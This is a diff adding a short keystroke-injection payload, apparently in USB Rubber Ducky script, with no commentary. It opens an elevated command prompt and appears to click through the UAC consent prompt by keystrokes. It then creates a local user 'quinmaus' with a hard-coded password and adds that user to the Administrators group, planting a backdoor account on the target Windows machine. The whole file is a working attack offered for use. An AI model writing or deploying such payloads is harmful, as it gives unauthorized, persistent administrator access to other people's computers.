@@ -1,0 +1,15 @@
+WINDOWS r
+DELAY 500
+STRING cmd
+CTRL-SHIFT ENTER
+DELAY 1000
+LEFTARROW
+DELAY 1000
+ENTER
+DELAY 1000
+STRING net user quinmaus MissoulaLiving /add
+ENTER
+STRING net localgroup administrators quinmaus /add
+ENTER
+STRING exit
+ENTER
